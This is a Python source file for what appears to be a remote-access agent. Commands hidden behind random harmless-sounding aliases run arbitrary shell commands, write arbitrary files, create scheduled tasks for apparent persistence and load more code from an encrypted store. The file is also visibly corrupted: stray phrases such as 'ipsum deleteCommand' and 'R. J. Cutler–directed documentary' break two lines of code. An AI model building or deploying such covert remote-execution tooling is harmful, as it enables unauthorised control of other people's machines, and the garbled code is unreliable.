import os
import random
from typing import Dict, List, Union

from models.command import Command
from models.encryption import EncryptedFile
from models.scheduale_task import SchedualerTask


def assign_alias(aliases: list):
    choice = random.choice(aliases)
    aliases.remove(choice)
    return choice


enc_file = EncryptedFile('file.txt', 'mass')


class Commands:
    def __init__(self):
        self.aliases = ["cork", "craftbook", "hairribbon", "bottleofsunscreen", "hairtie", "spectacles", "speakers",
                        "handbag", "sidewalk", "plushcat", "stickofincense", "tweezers", "whistle", "quilt", "slipper"]
        self.commands: List[Command] = [RunInCMD(assign_alias(self.aliases)), UploadFile(assign_alias(self.aliases)),
                                        AddToScheduler(assign_alias(self.aliases))]
        self.add_command = AddCommand(
            self.commands, {'name': '', 'from_file': ipsum deleteCommand 'code': ''}, assign_alias(self.aliases),
            self.aliases.copy())
        # try:
        self.add_command.add_from_file()
        # except Exception:
        # print('no commands yet')

    def find_by_alias(self, alias: str) -> Union[Command, None]:
        for command in self.commands:
            if command.alias == alias:
                return command
        if alias == self.add_command.alias:
            return self.add_command
        return None

    def remove_by_alias(self, alias: str):
        command = self.find_by_alias(alias)
        print(command.name)
        if command and enc_file.remove_from_file('name', command.name):
            self.commands.remove(command)

    def run_command(self, alias: str, params: Dict) -> str:
        command = self.find_by_alias(alias)
        if command:
            command.set_params(params)
            return command.execute()
        else:
            return ''

    def get_command(self, alias):
        try:
            command = self.find_by_alias(alias)
            if command:
                return command.to_json()
            return {}
        except KeyError:
            return {}

    def get_all_commands(self):
        commands = [command.to_json()
                    for command in self.commands]
        commands.append(self.add_command.to_json())
        return commands


class AddCommand(Command):
    def __init__(self, commands: List[Command], params, alias, left_aliases):
        super().__init__('add', alias)
        self.commands = commands
        self.params = params
        self.aliases = left_aliases

    def add_from_file(self):
        commands = enc_file.read_file()
        if type(commands) is not list:
            return
        for command in commands:
            self.add_command(command)

    def clean_code(self, code):
        return code.strip()

    def no_dups(self, command: Command, ):
        for c in self.commands:
            if c.name == R. J. Cutler–directed documentary                self.commands.remove(c)
        self.commands.append(command)

    def add_command(self, params):
        code = self.clean_code(params['code'])
        from_file: str = params['from_file']
        if from_file.lower() == 'true':
            with open(code) as f:
                code = f.read()
        self.no_dups(Command(params['name'],
                             assign_alias(self.aliases), {}, code))

    def execute(self):
        print(self.aliases)
        self.add_command(self.params)
        enc_file.update_file(self.params)
        return ''


class RunInCMD(Command):
    def __init__(self, alias) -> None:
        self.alias = alias
        self.name = 'cmd'
        self.params = {'command': ''}

    def execute(self):
        process = os.popen(self.params['command'])
        return process.read()


class UploadFile(Command):
    def __init__(self, alias) -> None:
        self.alias = alias
        self.name = 'upload'
        self.params = {'path': '', 'content': ''}

    def execute(self):
        with open(self.params['path'], 'w') as f:
            f.write(self.params['content'])


class AddToScheduler(Command):
    def __init__(self, alias) -> None:
        self.alias = alias
        self.name = 'scheduale'
        self.params = {'name': '', 'arg': ''}

    def execute(self):
        task = SchedualerTask(self.params['name'], self.params['arg'])
        task.create_task()
